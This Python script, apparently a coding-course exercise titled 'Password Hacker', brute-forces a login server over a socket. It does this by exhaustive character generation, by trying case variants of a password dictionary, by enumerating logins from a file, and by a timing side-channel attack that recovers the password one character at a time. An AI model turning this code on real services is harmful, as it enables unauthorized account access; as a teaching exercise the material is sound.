'''Password Hacker: Each Method have different functionality'''
import socket
import itertools
import json
from datetime import datetime, timedelta
from string import ascii_uppercase, ascii_lowercase, digits
from sys import argv


class Connector:
    def __init__(self, ip_address, port):
        self.ip = ip_address
        self.port = int(port)

    def connect(self):
        alphabet = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',
                    'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '1', '2',
                    '3', '4', '5', '6', '7', '8', '9', '0']
        gene = self.my_gen(alphabet)
        with socket.socket() as new_connection:
            new_connection.connect((self.ip, self.port))
            for i in range(1, 20000):
                store = next(gene)
                new_connection.send(store.encode())
                response = new_connection.recv(1024)
                response = response.decode()
                if response == 'Connection success!':
                    print(store)
                    break

    @staticmethod
    def my_gen(alph):
        for i in range(1, len(alph)):
            for j in itertools.product(alph, repeat=i):
                value = [''.join(k) for k in j]
                yield ''.join(value)

    @staticmethod
    def file_check(file_name):
        with open(file_name, 'r+', encoding='utf-8') as file1:
            for file in file1:
                container = file.replace('\n', '')
                inp = container
                n = len(inp)
                # Number of permutations is 2^n
                mx = 1 << n

                # Converting string to lower case
                inp = inp.lower()

                # Using all subsequences and permuting them
                for i in range(mx):
                    # If j-th bit is set, we convert it to upper case
                    combination = [k for k in inp]
                    for j in range(n):
                        if ((i >> j) & 1) == 1:
                            combination[j] = inp[j].upper()

                    temp = ""
                    # Printing current combination
                    for l in combination:
                        temp += l
                    yield temp

    def file_connect(self, file_name):
        with socket.socket() as new_connection:
            new_connection.connect((self.ip, self.port))
            file_value = self.file_check(file_name)
            while True:
                store = next(file_value)
                new_connection.send(store.encode())
                response = new_connection.recv(5120)
                response = response.decode()
                if response == 'Connection success!':
                    print(store)
                    break

    # @staticmethod
    # def permute():
    #     with open('C:\\Users\\Kalicharan Mohanta\\Downloads\\passwords.txt', 'r+', encoding='utf-8') as file1:
    #         for file in file1:
    #             inp = file.replace('\n', '')
    @staticmethod
    def admin_pass(self, file_name, store1, new_connection):
        file_value = self.file_check(file_name)
        admin_data = dict(login=store1, password=' ')
        while True:
            store = next(file_value)
            admin_data['password'] = store
            new_connection.send(json.dumps(admin_data).encode())
            response = new_connection.recv(5120).decode()
            response = json.loads(response)
            if response['result'] == 'Connection success!':
                print(json.dumps(admin_data))
                print(response)
                break

    def admin_login(self, file_name='', login=' ', password=' '):
        with socket.socket() as new_connection:
            new_connection.connect((self.ip, self.port))
            file_value = self.file_check(file_name)
            admin_data = dict(login=login, password=password)
            flag = 1
            while flag:
                store = next(file_value)
                admin_data['login'] = store
                new_connection.send(json.dumps(admin_data).encode())
                response = new_connection.recv(5120).decode()
                response = json.loads(response)
                if response['result'] == 'Wrong password!':
                    password_string = list()
                    count1 = 0
                    while flag:
                        for i in ascii_uppercase + ascii_lowercase + digits:
                            if len(password_string) <= count1:
                                password_string.append(str(i))
                            else:
                                password_string[count1] = i
                            admin_data['password'] = ''.join(password_string)
                            json_object = json.dumps(admin_data)
                            try:
                                new_connection.send(json_object.encode())
                                start = datetime.now()
                                response = new_connection.recv(1024).decode()
                                finish = datetime.now()
                                difference = finish - start
                                response = json.loads(response)
                                if difference >= timedelta(seconds=0.1):
                                    count1 += 1
                                elif response['result'] == 'Connection success!':
                                    json_object = json.dumps(admin_data)
                                    flag = 0
                                    print(json_object)
                            except ConnectionAbortedError:
                                pass


socket_connect = Connector(argv[1], argv[2])
socket_connect.admin_login(file_name='C:\\Users\\Kalicharan Mohanta\\Downloads\\logins.txt')
